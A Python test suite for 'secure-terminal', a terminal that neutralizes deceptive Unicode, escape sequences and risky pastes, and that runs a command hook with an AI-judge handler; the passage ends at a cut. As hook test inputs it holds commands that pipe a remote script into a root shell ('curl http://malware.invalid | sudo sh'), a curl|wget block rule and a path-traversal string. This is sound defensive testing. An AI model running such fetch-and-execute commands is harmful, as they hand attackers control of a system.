#!/usr/bin/python3 -Bsu

## Copyright (C) 2026 - 2026 ENCRYPTED SUPPORT LLC <adrelanos@whonix.org>
## See the file COPYING for copying conditions.

## AI-Assisted

"""
Test secure-terminal's pure sanitization core (secure_terminal.sanitize) and a
static HTML-safety property of the widget layer. The core is GUI-free, so it is
exercised directly with no PyQt6. Exit 0 on full pass, 1 on any failure, 77
(SKIP) when the module cannot be imported.

Source here is pure ASCII: codepoints are numbers and strings are built with
chr()/escape sequences, never raw non-ASCII bytes.
"""

import os
import sys

try:
    from secure_terminal import sanitize as S
except Exception as exc:  # pylint: disable=broad-except
    sys.stderr.write('secure-terminal-tests: SKIP (cannot import '
                     'secure_terminal.sanitize: %s)\n' % exc)
    sys.exit(77)

PASS = 0
FAIL = 0


def ok(cond, msg):
    global PASS, FAIL
    if cond:
        PASS += 1
    else:
        FAIL += 1
        sys.stderr.write('FAIL: ' + msg + '\n')


def eq(got, want, msg):
    ok(got == want, '%s -> %r, want %r' % (msg, got, want))


# --- render_output: strip (default, safe) -------------------------------------
CAFE = 'caf' + chr(0x00E9)                       # e-acute
CJK = chr(0x4E2D)
EMOJI = chr(0x1F600)
BIDI = chr(0x202E)                               # right-to-left override
ZWSP = chr(0x200B)                               # zero-width space
NBSP = chr(0x00A0)                               # no-break space
BEL = chr(0x07)
NUL = chr(0x00)

eq(S.render_output('plain ascii\t\n', 'strip'), 'plain ascii\t\n', 'strip keeps ascii+tab+nl')
eq(S.render_output(CAFE, 'strip'), 'caf_', 'strip replaces non-ascii with _')
eq(S.render_output('a' + BIDI + 'b', 'strip'), 'a_b', 'strip bidi')
eq(S.render_output('a' + ZWSP + 'b', 'strip'), 'a_b', 'strip zero-width')
eq(S.render_output('a' + NBSP + 'b', 'strip'), 'a_b', 'strip nbsp')
eq(S.render_output('a' + BEL + NUL + 'b', 'strip'), 'a__b', 'strip control -> _')

# --- render_output: show (render legit unicode, still neutralize deceptive) ----
eq(S.render_output(CAFE, 'show'), CAFE, 'show renders e-acute')
eq(S.render_output(CJK + EMOJI, 'show'), CJK + EMOJI, 'show renders cjk+emoji')
eq(S.render_output('a' + BIDI + 'b', 'show'), 'a_b', 'show still neutralizes bidi')
eq(S.render_output('a' + ZWSP + 'b', 'show'), 'a_b', 'show still neutralizes zero-width')
eq(S.render_output('a' + NBSP + 'b', 'show'), 'a_b', 'show still neutralizes nbsp')
eq(S.render_output('a' + BEL + 'b', 'show'), 'a_b', 'show still neutralizes control')

# --- render_output: reveal ----------------------------------------------------
eq(S.render_output(CAFE, 'reveal'), 'caf<U+00E9>', 'reveal e-acute')
eq(S.render_output('a' + BIDI + 'b', 'reveal'), 'a<U+202E>b', 'reveal bidi')
eq(S.render_output('a' + BEL + 'b', 'reveal'), 'a<U+0007>b', 'reveal control')
eq(S.render_output(EMOJI, 'reveal'), '<U+1F600>', 'reveal astral')

# --- render_output: detail (reveal badge + the Unicode name inline) -----------
eq(S.render_output(CAFE, 'detail'),
   'caf<U+00E9 LATIN SMALL LETTER E WITH ACUTE>', 'detail names e-acute')
eq(S.render_output('a' + BIDI + 'b', 'detail'),
   'a<U+202E RIGHT-TO-LEFT OVERRIDE>b', 'detail names the bidi override')
eq(S.render_output(EMOJI, 'detail'), '<U+1F600 GRINNING FACE>', 'detail names astral')
ok(all(0x20 <= ord(c) <= 0x7E for c in S.render_output(CAFE + BIDI + EMOJI, 'detail')),
   'detail badge is plain ASCII (safe in every display)')

# --- colored markings: risk class of a neutralized/revealed character ---------
eq(S.marking_class(0x202E), 'bidi', 'RLO is bidi')
eq(S.marking_class(0x200B), 'invisible', 'ZWSP is invisible')
eq(S.marking_class(0x07), 'control', 'BEL is control')
eq(S.marking_class(0x00E9), 'nonascii', 'e-acute is nonascii')
_mk = [(chr(0x202E), ())]
_runs, _ = S.cells_to_runs([], _mk, 'reveal', False, True)
ok(any(k == (S.MARK_KEY, 'bidi') for _t, k in _runs),
   'a bidi badge is tagged (MARK_KEY, bidi) for colouring when markings on')
_runs_off, _ = S.cells_to_runs([], _mk, 'reveal', False, False)
ok(all(not (isinstance(k, tuple) and k and k[0] == S.MARK_KEY) for _t, k in _runs_off),
   'no marking key emitted when colored markings are off')
# the run TEXT is identical either way -- colouring never changes what is shown
eq(''.join(t for t, _ in _runs), ''.join(t for t, _ in _runs_off),
   'colored markings change only the colour, never the safe text')
# a flood of alternating safe/marking chars must NOT explode into one run each
# (that would be one Qt insert per char and wedge the UI): the runs are capped.
_flood = [('a' if i % 2 else chr(0x202E), ()) for i in range(20000)]
_fr, _ = S.cells_to_runs([], _flood, 'strip', False, True)
ok(len(_fr) <= 2100,
   'marking runs are capped so a flood cannot defeat run-coalescing (%d runs)' % len(_fr))

# --- deferred autowrap (VT last-column behaviour) + wrap flags -----------------
_wc, _wcells, _wcol, _ws, _ww = S.feed_line_edits([], 0, {}, 'abcd\n', 4)
eq(len(_wc), 1, 'exactly-width output + newline is one line, no spurious blank wrap')
eq(_ww, [False], 'a newline-terminated line is not flagged a wrap')
_wc2, _wcells2, _wcol2, _ws2, _ww2 = S.feed_line_edits([], 0, {}, 'abcde', 4)
eq(len(_wc2), 1, 'the 5th char on a width-4 line wraps to a fresh row')
eq(_ww2, [True], 'the wrap is flagged so copy can join the rows')
eq([ch for ch, _ in _wcells2], ['e'], 'the wrapping char starts the new row')
_wc3, _wcells3, _wcol3, _ws3, _ww3 = S.feed_line_edits([], 0, {}, 'abcd\rX', 4)
eq(len(_wc3), 0, 'a carriage return after the last column cancels the pending wrap')
eq(_wcells3[0][0], 'X', 'the CR returns to column 0 and overwrites, no new row')
# a cursor/erase CSI op likewise clears the pending wrap: at width 4 the erase
# after the last column leaves the cursor there, so X overwrites (abcX), not wraps
_wc4, _wcells4, _wcol4, _ws4, _ww4 = S.feed_line_edits([], 0, {}, 'abcd\x1b[KX', 4)
eq(len(_wc4), 0, 'an erase op after the last column cancels the pending wrap')
eq([ch for ch, _ in _wcells4], ['a', 'b', 'c', 'X'],
   'the erase clears the pending wrap so X overwrites the last cell (abcX)')

# --- escapes are always stripped; editing controls always pass ----------------
ESC = '\x1b[31mRED\x1b[0m'
for mode in ('strip', 'show', 'reveal', 'detail'):
    eq(S.render_output(ESC, mode), 'RED', 'escape stripped in %s' % mode)
    eq(S.render_output('ab\x08\r\t\nX', mode), 'ab\x08\r\t\nX',
       'editing controls pass in %s' % mode)

# CSI with a private-parameter prefix (< = > ?) -- a capable-TERM program emits
# these (modifyOtherKeys "\x1b[>4;2m", cursor hide "\x1b[?25l") -- must strip whole
eq(S.render_output('a\x1b[>4;2mb', 'strip'), 'ab', 'strip CSI private > param')
eq(S.render_output('a\x1b[?25lb', 'strip'), 'ab', 'strip CSI private ? param')
eq(S.render_output('a\x1b[=3hb', 'strip'), 'ab', 'strip CSI private = param')
# CSI cursor moves, OSC hyperlink and bare escapes all vanish
eq(S.render_output('a\x1b[2Jb', 'strip'), 'ab', 'strip CSI clear')
eq(S.render_output('a\x1b]8;;http://evil\x07b', 'strip'), 'ab', 'strip OSC link')

# --- describe_codepoint: the reveal-badge tooltip -----------------------------
_euro = S.describe_codepoint(0x20AC)
ok('U+20AC' in _euro and 'EURO SIGN' in _euro and 'Currency Symbol' in _euro
   and '\\u20ac' in _euro, 'describe_codepoint: euro name+category+escape')
ok('RIGHT-TO-LEFT OVERRIDE' in S.describe_codepoint(0x202E), 'describe: bidi name')
ok('\\U0001f600' in S.describe_codepoint(0x1F600), 'describe: astral uses \\U escape')
ok('not a code point' in S.describe_codepoint(0x110000), 'describe: out-of-range guarded')
ok('unnamed' in S.describe_codepoint(0x07), 'describe: unnamed control still described')

# --- full-screen (alternate screen) detection ---------------------------------
ok(S.wants_full_screen('\x1b[?1049h') is True, 'detects alt-screen enter (1049)')
ok(S.wants_full_screen('\x1b[?47h') is True, 'detects alt-screen enter (47)')
ok(S.wants_full_screen('plain text') is False, 'no false positive on plain text')
ok(S.leaves_full_screen('\x1b[?1049l') is True, 'detects alt-screen leave (1049)')
ok(S.leaves_full_screen('\x1b[?1049h') is False, 'enter is not a leave')

# --- sanitize_bytes / sanitize_paste ------------------------------------------
eq(S.sanitize_bytes(b'a\x08 \x08', 'strip'), 'a\x08 \x08', 'sanitize_bytes keeps bs/space')
eq(S.sanitize_paste('a\nb\r\tc'), 'a\rb\r\tc', 'paste nl/cr -> cr, tab kept')
eq(S.sanitize_paste('ex' + chr(0x0430) + 'mple.org'), 'exmple.org', 'paste strips cyrillic homoglyph')
eq(S.sanitize_paste('x' + BIDI + ZWSP + 'y'), 'xy', 'paste strips bidi+zw')

# --- paste_findings -----------------------------------------------------------
eq(S.paste_findings('plain ascii\n\t'), (False, False), 'findings clean')
eq(S.paste_findings(CAFE), (True, False), 'findings unicode')
eq(S.paste_findings('a' + BEL + 'b'), (False, True), 'findings control')
eq(S.paste_findings('a' + BIDI + NUL), (True, True), 'findings both')

# --- colours: environment gate (NO_COLOR only, NOT the launch TERM) -----------
saved_env = {k: os.environ.get(k) for k in ('NO_COLOR', 'TERM', 'COLORTERM')}
try:
    os.environ.pop('NO_COLOR', None)
    os.environ['TERM'] = 'xterm'
    ok(S.colors_allowed() is True, 'colors allowed on xterm w/o NO_COLOR')
    os.environ['NO_COLOR'] = '1'
    ok(S.colors_allowed() is False, 'NO_COLOR forces off')
    os.environ['NO_COLOR'] = ''       # spec: an EMPTY NO_COLOR does not disable
    ok(S.colors_allowed() is True, 'empty NO_COLOR does not force off')
    os.environ.pop('NO_COLOR', None)
    os.environ['TERM'] = 'dumb'
    # a dumb LAUNCH TERM must NOT disable colours: the terminal renders to a
    # screen, not to its parent (regression: launched from a line-mode terminal)
    ok(S.colors_allowed() is True, 'a dumb launch TERM does not force colours off')
finally:
    for key, value in saved_env.items():
        if value is None:
            os.environ.pop(key, None)
        else:
            os.environ[key] = value

# --- colours: contrast guard (luminance) --------------------------------------
BLACK = (0, 0, 0)
DARK_BG = (0x14, 0x16, 0x1b)
RED = (0xcd, 0, 0)
GREEN = (0, 0xcd, 0)
WHITE = (0xff, 0xff, 0xff)
ok(S.too_close(BLACK, BLACK) is True, 'black vs black too close')
ok(S.too_close(BLACK, DARK_BG) is True, 'black on dark too close (guarded)')
ok(S.too_close(RED, DARK_BG) is False, 'red on dark is fine')
ok(S.too_close(GREEN, DARK_BG) is False, 'green on dark is fine')
ok(S.too_close(WHITE, WHITE) is True, 'white on white too close')

# --- colours: SGR parser ------------------------------------------------------
def sgr(param):
    state = {'fg': None, 'bg': None, 'bold': False}
    return S.parse_sgr(param, state)

eq(sgr('31'), {'fg': 1, 'bg': None, 'bold': False}, 'sgr 31 = red fg')
eq(sgr('42'), {'fg': None, 'bg': 2, 'bold': False}, 'sgr 42 = green bg')
eq(sgr('91'), {'fg': 9, 'bg': None, 'bold': False}, 'sgr 91 = bright red fg')
eq(sgr('1'), {'fg': None, 'bg': None, 'bold': True}, 'sgr 1 = bold')
eq(sgr('1;31;42'), {'fg': 1, 'bg': 2, 'bold': True}, 'sgr combined')
eq(sgr('31;0'), {'fg': None, 'bg': None, 'bold': False}, 'sgr 0 resets')
eq(sgr(''), {'fg': None, 'bg': None, 'bold': False}, 'empty sgr = reset')
eq(sgr('39;49'), {'fg': None, 'bg': None, 'bold': False}, 'default fg/bg')
# 8-bit / 24-bit params are consumed, colour falls back to default (not honored)
eq(sgr('38;5;196'), {'fg': None, 'bg': None, 'bold': False}, '8-bit consumed')
eq(sgr('38;2;10;20;30'), {'fg': None, 'bg': None, 'bold': False}, '24-bit consumed')
eq(sgr('38;5;196;1'), {'fg': None, 'bg': None, 'bold': True}, '8-bit then bold')

# --- tui_cell: one-character-wide, grid-preserving cell sanitization ----------
eq(S.tui_cell('A', 'strip'), 'A', 'tui ascii kept')
eq(S.tui_cell(CAFE[-1], 'strip'), '_', 'tui strip non-ascii -> _')
eq(S.tui_cell(CAFE[-1], 'show'), CAFE[-1], 'tui show renders glyph')
eq(S.tui_cell(chr(0x2500), 'show'), chr(0x2500), 'tui show renders box-drawing')
eq(S.tui_cell(BIDI, 'show'), '_', 'tui show still neutralizes bidi')
eq(S.tui_cell(ZWSP, 'show'), '_', 'tui show still neutralizes zero-width')
eq(S.tui_cell(BEL, 'strip'), '_', 'tui control -> _')
# reveal cannot show a <U+XXXX> badge in a fixed cell, so in TUI it collapses to
# the safe "_" (like strip) -- never the raw glyph, which would render a homoglyph
# deceptively under the green "reveal is safe" lamp.
eq(S.tui_cell(CAFE[-1], 'reveal'), '_', 'tui reveal is safe "_", not the glyph')
eq(S.tui_cell(BIDI, 'reveal'), '_', 'tui reveal neutralizes bidi one-wide')
eq(S.tui_cell('', 'strip'), ' ', 'tui empty cell -> space')
# a pyte cell may be a multi-codepoint grapheme (base + combining) -> must not
# crash (this is what "cat /dev/random" in show mode hit)
_grapheme = 'a' + chr(0x0301)                    # a + combining acute
eq(S.tui_cell(_grapheme, 'show'), _grapheme, 'tui multi-cp grapheme kept in show')
eq(S.tui_cell(_grapheme, 'strip'), '_', 'tui multi-cp grapheme -> _ in strip')
eq(S.tui_cell('a' + BEL, 'show'), '_', 'tui grapheme with a control -> _')
ok(isinstance(S.tui_cell(chr(0x1F600) + chr(0x1F600), 'show'), str),
   'tui two-astral cell does not crash')
# apply_line_edits: the pure line-editing model behind the fast bulk render path
eq(S.apply_line_edits('', 0, 'abc'), ([], 'abc', 3), 'line edits: plain append')
_cl, _ln, _col = S.apply_line_edits('', 0, 'l1\nl2\n')
eq((_cl, _ln), (['l1', 'l2'], ''), 'line edits: newline splits off completed lines')
eq(S.apply_line_edits('123456', 6, '\rAB'), ([], 'AB3456', 2),
   'line edits: bare CR then overwrite')
_cl, _ln, _col = S.apply_line_edits('abc', 3, '\x08 \x08')
eq((_ln.rstrip(), _col), ('ab', 2), 'line edits: backspace erase')
# max_line hard-wraps a runaway newline-free line so a flood cannot build one
# unbounded block
_cl, _ln, _col = S.apply_line_edits('', 0, 'x' * 25, 10)
eq((len(_cl), [len(_c) for _c in _cl], _ln), (2, [10, 10], 'xxxxx'),
   'line edits: max_line wraps a runaway line')
# classify_paste: name and count the hidden classes so the paste warning can say
# exactly what a copied string carries
eq(S.classify_paste('echo hello'), [], 'clean ASCII has no findings')
_pc = dict(S.classify_paste('pay' + chr(0x0430) + 'l' + chr(0x202E)
                            + chr(0x200B) + BEL))
eq(_pc.get('bidirectional control'), 1, 'classify: bidi override counted')
eq(_pc.get('invisible character'), 1, 'classify: zero-width counted')
eq(_pc.get('non-ASCII character'), 1, 'classify: homoglyph counted')
eq(_pc.get('control character'), 1, 'classify: control counted')
# sanitize_paste_unicode: keeps printable non-ASCII, drops the deceptive classes
eq(S.sanitize_paste_unicode('caf' + chr(0x00E9)), 'caf' + chr(0x00E9),
   'unicode paste keeps printable non-ASCII')
ok(chr(0x202E) not in S.sanitize_paste_unicode('a' + chr(0x202E) + 'b'),
   'unicode paste drops a bidi override')
eq(S.sanitize_paste_unicode('a\nb'), 'a\rb', 'unicode paste: newline -> CR')

# --- sanitize_title: program-supplied title / notification -> safe ASCII ------
eq(S.sanitize_title('My Build'), 'My Build', 'title plain ascii')
eq(S.sanitize_title('ev' + BIDI + 'il'), 'evil', 'title strips bidi')
eq(S.sanitize_title('a\tb\nc'), 'a b c', 'title collapses whitespace')
eq(S.sanitize_title(CAFE), 'caf', 'title drops non-ascii')
eq(S.sanitize_title('x' * 200)[:5], 'xxxxx', 'title capped')
ok(len(S.sanitize_title('x' * 200)) <= 80, 'title length limit')
eq(S.sanitize_title(''), '', 'title empty')
eq(S.sanitize_title(None), '', 'title none-safe')
# Regression (found by ClusterFuzzLite/Atheris): collapse-then-cap could leave a
# trailing space when the cap landed on one, so re-sanitizing shrank the title by
# a character. sanitize_title must be idempotent.
_capped_on_space = S.sanitize_title('a ' * 60)
eq(_capped_on_space, S.sanitize_title(_capped_on_space), 'title idempotent (cap on space)')
ok(not _capped_on_space.endswith(' '), 'title no trailing space after cap')

# --- constants ----------------------------------------------------------------
ok(len(S.ANSI_PALETTE) == 16, '16-colour palette')
ok(S.DISPLAY_MODES == ('strip', 'show', 'reveal', 'detail'), 'display modes')
ok(set(S.THEMES) == {'dark', 'light'}, 'themes')

# --- HTML-injection safety: the widget layer must not use an HTML sink --------
# secure-terminal shows output via QPlainTextEdit.insertText (plain text), never
# an HTML-rendering path, so a printed "<b>" or "<script>" is inert. Guard that
# no forbidden API creeps in.
pkg_dir = os.path.dirname(os.path.abspath(S.__file__))
forbidden = ['setHtml', 'insertHtml', 'appendHtml', 'setMarkdown',
             'QTextBrowser', 'mightBeRichText', '.toHtml(']
for name in ('terminal.py', 'main.py', 'dialog.py'):
    path = os.path.join(pkg_dir, name)
    try:
        with open(path, encoding='utf-8') as handle:
            src = handle.read()
    except OSError:
        continue
    for bad in forbidden:
        ok(bad not in src, 'HTML sink %r absent from %s' % (bad, name))

# --- session persistence (pure JSON under a temp state dir) -------------------
import tempfile                                    # noqa: E402
os.environ['XDG_STATE_HOME'] = tempfile.mkdtemp(prefix='st-session-')
from secure_terminal import session as SESS       # noqa: E402

eq(SESS.load(), [], 'no session -> empty list')
_tabs = [{'name': 'a', 'text': 'l1\nl2\nl3', 'zoom': 100},
         {'name': 'b', 'text': 'x'}]
SESS.save(_tabs)
eq(SESS.load(), _tabs, 'session round-trips')
# each tab's scrollback is its own log file; the index json holds no bulk text
import glob as _glob                                # noqa: E402
_sdir = os.path.join(os.environ['XDG_STATE_HOME'], 'secure-terminal')
eq(len(_glob.glob(os.path.join(_sdir, 'tab-*.log'))), 2, 'one log file per tab')
with open(os.path.join(_sdir, 'tab-0.log'), encoding='utf-8') as _h:
    eq(_h.read(), 'l1\nl2\nl3', 'tab-0 log holds that tab scrollback')
with open(SESS.session_path(), encoding='utf-8') as _h:
    ok('l1\nl2\nl3' not in _h.read(), 'index json holds no scrollback text')
SESS.save(_tabs[:1])
eq(len(_glob.glob(os.path.join(_sdir, 'tab-*.log'))), 1,
   'stale per-tab log removed when the tab count shrinks')
SESS.clear()
eq(_glob.glob(os.path.join(_sdir, 'tab-*.log')), [],
   'clear removes every per-tab log')
eq(SESS.load(), [], 'cleared session -> empty')
eq(SESS.cap_text('\n'.join(str(i) for i in range(10)), 3), '7\n8\n9',
   'cap_text keeps the tail')
ok(len(SESS.cap_text('\n'.join(str(i) for i in range(9999)), 0).split('\n'))
   <= SESS.UNLIMITED_PERSIST_LINES, 'unlimited scrollback is capped')
with open(SESS.session_path(), 'w', encoding='utf-8') as _h:
    _h.write('{ not valid json')
eq(SESS.load(), [], 'corrupt session -> empty, no crash')

# --- settings drop-in: precedence, lexical order, .conf-only ------------------
from secure_terminal import settings as SET       # noqa: E402
_sysd = tempfile.mkdtemp(prefix='st-sys-')
_usrd = tempfile.mkdtemp(prefix='st-usr-')
SET._system_dirs = lambda: [_sysd]                 # privileged (root) dir
SET._user_config_dir = lambda: _usrd               # user dir (highest)
with open(os.path.join(_sysd, '10-seed.conf'), 'w', encoding='utf-8') as _h:
    _h.write('theme=dark\nzoom=100\n')
with open(os.path.join(_usrd, '90-user.conf'), 'w', encoding='utf-8') as _h:
    _h.write('theme=light\n')
eq(SET.load().get('theme'), 'light', 'settings: user dir overrides system seed')
eq(SET.load().get('zoom'), '100', 'settings: un-overridden seed value kept')
with open(os.path.join(_usrd, '99-z.conf'), 'w', encoding='utf-8') as _h:
    _h.write('theme=dark\n')
eq(SET.load().get('theme'), 'dark', 'settings: lexical order, later file wins')
with open(os.path.join(_usrd, 'ignore.txt'), 'w', encoding='utf-8') as _h:
    _h.write('theme=light\n')
eq(SET.load().get('theme'), 'dark', 'settings: only .conf files are parsed')
SET.save({'colors': 'true'})
ok(SET.user_config_file().endswith('50_user.conf'),
   'settings: app writes 50_user.conf')
eq(SET.load().get('colors'), 'true', 'settings: written value loads back')

# admin lock: a privileged `lock=` makes a key non-overridable by the user dir
with open(os.path.join(_sysd, '20-lock.conf'), 'w', encoding='utf-8') as _h:
    _h.write('colors=false\nlock=colors\n')
with open(os.path.join(_usrd, '95-try.conf'), 'w', encoding='utf-8') as _h:
    _h.write('colors=true\n')
_lc = SET.load()
eq(_lc.get('colors'), 'false', 'settings: locked key keeps the admin value')
eq(list(_lc.violations), ['colors'], 'settings: ignored override recorded')
ok('colors' in _lc.locked, 'settings: lock reported')
# a user config cannot lock a key
with open(os.path.join(_usrd, '96-userlock.conf'), 'w', encoding='utf-8') as _h:
    _h.write('theme=light\nlock=theme\n')
ok('theme' not in SET.load().locked, 'settings: a user config cannot lock a key')
# privileged-only keys (remote_control): admin-only, no lock= needed
ok('remote_control' in SET.load().locked,
   'settings: remote_control is always privileged (auto-locked)')
with open(os.path.join(_usrd, '97-rc.conf'), 'w', encoding='utf-8') as _h:
    _h.write('remote_control=true\n')
eq(SET.load().get('remote_control'), None,
   'settings: a user config cannot enable remote_control')
with open(os.path.join(_sysd, '25-rc.conf'), 'w', encoding='utf-8') as _h:
    _h.write('remote_control=true\n')
eq(SET.load().get('remote_control'), 'true',
   'settings: only a privileged dir can enable remote_control')

# --- ipc: single-instance socket helpers (Qt-free) ----------------------------
import struct                                          # noqa: E402
from secure_terminal import ipc as IPC                # noqa: E402
# a group name can never escape the socket directory (path traversal)
ok(os.path.basename(IPC.socket_path('../../etc/evil')).endswith('.sock')
   and '/' not in os.path.basename(IPC.socket_path('a/b/c')),
   'ipc: group name is reduced to a safe filename')
eq(IPC.socket_path(''), IPC.socket_path('default'), 'ipc: empty group -> default')
# Framer reassembles a length-prefixed frame across chunks
_fr = IPC.Framer()
_full = IPC.frame(b'hello')
ok(_fr.feed(_full[:3]) is None, 'ipc: framer waits for the length prefix')
eq(_fr.feed(_full[3:]), b'hello', 'ipc: framer returns the completed payload')
_over = IPC.Framer()
raised = False
try:
    _over.feed(struct.pack('<I', 1 << 30) + b'x')
except ValueError:
    raised = True
ok(raised, 'ipc: an over-long frame is rejected')
# no server in a fresh group -> no reply (client would start a new instance)
os.environ['XDG_RUNTIME_DIR'] = tempfile.mkdtemp()
ok(IPC.send_request('nobody-home', {'op': 'ping'}, timeout=0.2) is None,
   'ipc: no running instance -> None')

# --- CLI: the sanitizing pty wrapper shares the sanitize core ------------------
import subprocess                                   # noqa: E402


def _run_cli(args, timeout=30):
    """Run secure-terminal-cli with `args` (a list), stdin from /dev/null, and
    return (stdout_text, exit_code). Invoked via the module so PYTHONPATH from
    the running suite locates it in a checkout."""
    code = ('import sys\n'
            'from secure_terminal.cli import main\n'
            'sys.exit(main(%r))\n' % (args,))
    proc = subprocess.run(
        [sys.executable, '-c', code],
        env=dict(os.environ, PYTHONPATH=os.pathsep.join(sys.path)),
        stdin=subprocess.DEVNULL, stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL, timeout=timeout)
    return proc.stdout.decode('utf-8', 'replace'), proc.returncode


# printf interprets the backslash-octal, so pass LITERAL backslashes (a single
# Python backslash would be interpreted here and then double-encoded through argv)
# strip mode: escapes removed, text kept, bidi neutralized to _
_o, _ = _run_cli(['--mode', 'strip', '--', 'printf',
                  'X\\033[31mRED\\033[0m Y\\342\\200\\256Z'])
ok('\x1b' not in _o and 'RED' in _o, 'cli strip: escapes gone, text kept')
ok('_' in _o and chr(0x202E) not in _o, 'cli strip: bidi -> _')
# show mode: printable non-ASCII kept, escapes still gone
_o, _ = _run_cli(['--mode', 'show', '--', 'printf', 'caf\\303\\251 \\033[1mB\\033[0m'])
ok(chr(0x00E9) in _o and '\x1b' not in _o, 'cli show: unicode kept, escapes gone')
# reveal mode: non-ASCII as <U+XXXX>
_o, _ = _run_cli(['--mode', 'reveal', '--', 'printf', 'a\\342\\200\\256b'])
ok('<U+202E>' in _o, 'cli reveal: bidi as <U+XXXX> badge')
# the child exit code is forwarded
_o, _rc = _run_cli(['--', 'sh', '-c', 'exit 42'])
eq(_rc, 42, 'cli forwards the child exit code')
# the two safe cursor controls (backspace, carriage return) pass through
_o, _ = _run_cli(['--', 'printf', 'a\x08b\rc'])
ok('\x08' in _o and '\r' in _o, 'cli keeps backspace and carriage return')
# any other control character is neutralized to _
_o, _ = _run_cli(['--', 'printf', 'x\x07y'])
ok('_' in _o and '\x07' not in _o, 'cli strips other control chars (BEL) to _')
# no command -> the login shell, which exits on our stdin EOF (must not hang)
_o, _rc = _run_cli(['--mode', 'strip'], timeout=15)
ok(isinstance(_rc, int), 'cli default shell exits on stdin EOF')

# --- command hook: verdict protocol, escalation, fail modes, sanitization -----
from secure_terminal import hook as HOOK           # noqa: E402


def _handler(body):
    return [sys.executable, '-c', 'import sys, json\n' + body]


_H = _handler(
    'r = json.load(sys.stdin); c = r.get("command", "")\n'
    'if "transcript" not in r and "deep" in c:\n'
    '    print(json.dumps({"verdict": "need_transcript"}))\n'
    'elif "sudo sh" in c:\n'
    '    print(json.dumps({"verdict": "block", "message": "no",'
    ' "suggestion": "ls\\n\\x1b[31mx"}))\n'
    'elif "curl" in c:\n'
    '    print(json.dumps({"verdict": "ask", "message": "careful"}))\n'
    'elif "transcript" in r:\n'
    '    print(json.dumps({"verdict": "allow",'
    ' "message": "tlen=%d" % len(r["transcript"])}))\n'
    'else:\n'
    '    print(json.dumps({"verdict": "allow"}))')
eq(HOOK.evaluate(_H, 'ls')['verdict'], 'allow', 'hook allows a safe command')
# a harmless illustration of a dangerous pattern (RFC-invalid host: safe if run)
_hb = HOOK.evaluate(_H, 'curl http://malware.invalid | sudo sh')
eq(_hb['verdict'], 'block', 'hook blocks')
eq(_hb['message'], 'no', 'hook block message passed through')
ok('\n' not in _hb['suggestion'] and '\x1b' not in _hb['suggestion'],
   'hook suggestion sanitized: no newline (no auto-run), no escape')
eq(HOOK.evaluate(_H, 'curl http://x.invalid | sh')['verdict'], 'ask', 'hook asks')
_ht = HOOK.evaluate(_H, 'deep dive', transcript_provider=lambda: 'SCROLL')
ok(_ht['verdict'] == 'allow' and 'tlen=6' in _ht['message'],
   'hook need_transcript triggers a second call with the transcript')
_bad = _handler('print("nonsense")')
ok(HOOK.evaluate(_bad, 'x', on_error='allow')['verdict'] == 'allow'
   and HOOK.evaluate(_bad, 'x', on_error='allow')['error'],
   'malformed handler fails open (allow) with the error flagged')
eq(HOOK.evaluate(_bad, 'x', on_error='block')['verdict'], 'block',
   'malformed handler fails closed when configured')
# the shipped example handler blocks a remote script piped to a root shell
_usr = HOOK.__file__
for _ in range(5):
    _usr = os.path.dirname(_usr)
_ex = os.path.join(_usr, 'share', 'secure-terminal', 'hooks', 'example-hook')
if os.path.exists(_ex):
    eq(HOOK.evaluate([sys.executable, _ex],
                     'curl http://malware.invalid | sudo sh')['verdict'], 'block',
       'example hook blocks curl | sudo sh')
# the AI-judge example handler: fast-path, escalation, AI verdict, fail-open
import json as _json                               # noqa: E402
_aij = os.path.join(_usr, "share", "secure-terminal", "hooks", "ai-judge-hook")
if os.path.exists(_aij):
    _mockai = tempfile.mktemp(prefix="mock-ai-")
    with open(_mockai, "w", encoding="utf-8") as _mh:
        _mh.write("#!/usr/bin/python3\nimport sys\np = sys.stdin.read()\n"
                  'print("{\\"verdict\\": \\"block\\"}" if "sudo sh" in p '
                  'else "{\\"verdict\\": \\"allow\\"}")\n')
    os.chmod(_mockai, 0o755)

    def _run_aij(req, ai=None):
        env = dict(os.environ, SECURE_TERMINAL_AI=ai or _mockai)
        proc = subprocess.run([sys.executable, _aij], env=env,
                              input=_json.dumps(req).encode("utf-8"),
                              stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
                              timeout=30)
        return _json.loads(proc.stdout.decode("utf-8", "replace"))

    eq(_run_aij({"command": "ls -la"})["verdict"], "allow",
       "ai-judge allows a trivial command without calling the AI")
    eq(_run_aij({"command": "cp $SRC dest"})["verdict"], "need_transcript",
       "ai-judge escalates a contextual command")
    eq(_run_aij({"command": "curl http://malware.invalid | sudo sh",
                 "transcript": "x"})["verdict"], "block",
       "ai-judge blocks via the AI verdict")
    eq(_run_aij({"command": "gpg x", "transcript": "y"},
                ai="/nonexistent-ai-xyz")["verdict"], "allow",
       "ai-judge fails open when the AI is unavailable")
    os.remove(_mockai)

# --- hooklib: tiered, admin-gated hook configuration --------------------------
import importlib.util as _ilu                       # noqa: E402
_hlpath = os.path.join(_usr, 'share', 'secure-terminal', 'hooks', 'hooklib.py')
if os.path.exists(_hlpath):
    _spec = _ilu.spec_from_file_location('hooklib', _hlpath)
    _hl = _ilu.module_from_spec(_spec)
    _spec.loader.exec_module(_hl)
    _priv = tempfile.mkdtemp()
    _pd = os.path.join(_priv, 'secure-terminal.d')
    os.makedirs(_pd)
    _homebase = tempfile.mkdtemp()
    _hd = os.path.join(_homebase, 'secure-terminal.d')
    os.makedirs(_hd)
    _hl._PRIVILEGED = (_priv,)
    _saved_xdg = os.environ.get('XDG_CONFIG_HOME')
    os.environ['XDG_CONFIG_HOME'] = _homebase
    try:
        # rules parse: fields split on ' | '; a regex ALTERNATION (curl|wget),
        # whose pipe has no surrounding spaces, must NOT be split (regression).
        with open(os.path.join(_pd, 'example-hook-rules.conf'), 'w') as _f:
            _f.write('block | \\b(curl|wget)\\b | piped\n'
                     '# a comment\nbadline\n'
                     'ask | ^sudo | root\n')
        eq(_hl.read_rules('example-hook-rules.conf'),
           [('block', '\\b(curl|wget)\\b', 'piped', ''), ('ask', '^sudo', 'root', '')],
           'hooklib: rules parsed; regex alternation not split; comments skipped')
        # the gate: the home tier is IGNORED by default
        with open(os.path.join(_hd, 'ai-judge-prompt.txt'), 'w') as _f:
            _f.write('USER PROMPT')
        ok(not _hl.allow_user_config(), 'hooklib: user hook config off by default')
        eq(_hl.read_file('ai-judge-prompt.txt'), None,
           'hooklib: home tier ignored unless an admin allows it')
        # an admin enables it in a PRIVILEGED tier -> the home file is now honored
